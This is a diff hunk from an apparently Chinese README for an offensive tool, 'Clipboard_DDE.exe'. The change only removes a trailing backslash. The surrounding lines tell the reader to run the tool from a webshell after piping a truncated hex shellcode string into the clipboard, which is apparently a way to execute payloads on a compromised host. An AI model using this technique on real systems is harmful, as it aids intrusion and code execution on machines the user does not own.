@@ -14,7 +14,7 @@
 用法：webshell命令行下执行
 ```
 echo fc4883e4f0e8c00000004... | clip
-start Clipboard_DDE.exe\
+start Clipboard_DDE.exe
 ```
 
 原理：
